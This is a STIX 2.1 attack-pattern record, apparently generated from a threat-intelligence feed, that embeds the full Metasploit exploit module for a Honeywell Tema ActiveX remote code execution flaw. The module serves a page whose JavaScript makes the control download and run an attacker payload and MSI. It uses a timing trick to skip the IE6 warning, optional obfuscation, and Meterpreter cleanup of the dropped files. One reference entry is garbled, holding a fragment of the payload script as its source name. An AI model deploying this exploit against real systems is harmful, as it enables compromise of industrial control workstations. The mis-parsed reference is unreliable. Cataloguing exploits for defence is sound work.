{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--82e386f5-0708-4cfd-83ff-f4a6e2ece95f",
    "created": "2024-08-14T16:43:31.699438Z",
    "modified": "2024-08-14T16:43:31.699442Z",
    "name": "\"Honeywell Tema Remote Installer ActiveX Remote Code Execution\"",
    "description": " This module exploits a vulnerability found in the Honeywell Tema ActiveX Remote",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/honeywell_tema_exec.rb",
            "external_id": "honeywell_tema_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-11-285-01"
        },
        {
            "source_name": "setTimeout(\"obj.DownloadFromURL(#{get_uri}/ThinClient_TemaKit.msi);\"",
            "external_id": "1000);"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"Honeywell Tema Remote Installer ActiveX Remote Code Execution\",\n        'Description' => %q{\n          This module exploits a vulnerability found in the Honeywell Tema ActiveX Remote\n          Installer.  This ActiveX control can be abused by using the DownloadFromURL()\n          function to install an arbitrary MSI from a remote location without checking source\n          authenticity or user notification. This module has been tested successfully with\n          the Remote Installer ActiveX installed with Honeywell EBI R410.1 - TEMA 5.3.0 and\n          Internet Explorer 6, 7 and 8 on Windows XP SP3.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Billy Rios', # Vulnerability discovery\n          'Terry McCorkle', # Vulnerability discovery\n          'juan vazquez' # Metasploit\n        ],\n        'References' => [\n          [ 'OSVDB', '76681' ],\n          [ 'BID', '50078' ],\n          [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-11-285-01' ]\n        ],\n        'Payload' => {\n          'Space' => 2048,\n          'StackAdjustment' => -3500\n        },\n        'DefaultOptions' => {\n          'EXITFUNC' => \"none\",\n          'InitialAutoRunScript' => 'migrate -k -f'\n        },\n        'Platform' => 'win',\n        'Targets' => [\n          # HoneyWell EBI R410.1 - TEMA 5.3.0\n          # Tema_RemoteInstaller.ocx 1.0.0.0\n          [ 'Automatic', {} ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2011-10-20',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def exploit\n    @dropped_files = [\n      'payload.exe',\n      'ThinClient_TemaKit.msi',\n      'ThinClient_TemaKit.log'\n    ]\n    super\n  end\n\n  def on_new_session(session)\n    if session.type == \"meterpreter\"\n      session.core.use(\"stdapi\") unless session.ext.aliases.include?(\"stdapi\")\n\n      @dropped_files.each do |file|\n        win_file = file.gsub(\"/\", \"\\\\\\\\\")\n        begin\n          wintemp = session.sys.config.getenv('WINDIR')\n          win_file = \"#{wintemp}\\\\Temp\\\\#{win_file}\"\n          # Meterpreter should do this automatically as part of\n          # fs.file.rm().  Until that has been implemented, remove the\n          # read-only flag with a command.\n          session.shell_command_token(%Q|attrib.exe -r \"#{win_file}\"|)\n          session.fs.file.rm(win_file)\n          print_good(\"Deleted #{file}\")\n          true\n        rescue ::Rex::Post::Meterpreter::RequestError\n          print_error(\"Failed to delete #{win_file}\")\n          false\n        end\n      end\n    end\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n\n    # Windows 7 isn't normally supported because the user won't have write access to the\n    # %WINDIR%/Temp directory, where the downloaded components are stored.\n    if not (agent =~ /MSIE \\d/ and agent =~ /NT 5\\.1/) and agent !~ /Tema_RemoteInstaller/\n      print_error(\"Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    # exec_payload.msi needs it to be named payload.exe\n    # atm there isn't msi generation on the fly\n    if request.uri =~ /payload\\.exe$/\n      return if ((p = regenerate_payload(cli)) == nil)\n\n      data = generate_payload_exe({ :code => p.encoded })\n      print_status(\"Sending payload\")\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    if request.uri =~ /\\.msi$/\n      msi_source = ::File.join(Msf::Config.data_directory, \"exploits\", \"exec_payload.msi\")\n      source = ::File.open(msi_source, \"rb\") { |fd| fd.read(fd.stat.size) }\n      print_status(\"Sending msi\")\n      send_response(cli, source, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    if agent =~ /MSIE 6/\n      # The 'setTimeout' trick allows to execute the installer on IE6 even if the user\n      # doesn't click the warning popup when downloading the payload.\n      # The ThinClient_TemaKit.msi installer name must be static.\n      # <object id=\"obj\" classid=\"clsid:E01DF79C-BE0C-4999-9B13-B5F7B2306E9B\">\n      js = <<-EOS\n      var obj = new ActiveXObject('Tema_RemoteInstaller.RemoteInstaller');\n      setTimeout(\"obj.DownloadFromURL('#{get_uri}/ThinClient_TemaKit.msi');\", 1000);\n      obj.DownloadFromURL('#{get_uri}/payload.exe');\n      EOS\n    else\n      js = <<-EOS\n      var obj = new ActiveXObject('Tema_RemoteInstaller.RemoteInstaller');\n      obj.DownloadFromURL('#{get_uri}/payload.exe');\n      obj.DownloadFromURL('#{get_uri}/ThinClient_TemaKit.msi');\n      EOS\n    end\n\n    js.gsub!(/\\t\\t\\t/, \"\")\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    html = <<-EOS\n    <html>\n    <body>\n    </object>\n    <script>\n    #{js}\n    </script>\n    </body>\n    </html>\n    EOS\n\n    print_status(\"Sending html\")\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2011-10-20",
    "x_mitre_platforms": [
        "win'"
    ]
}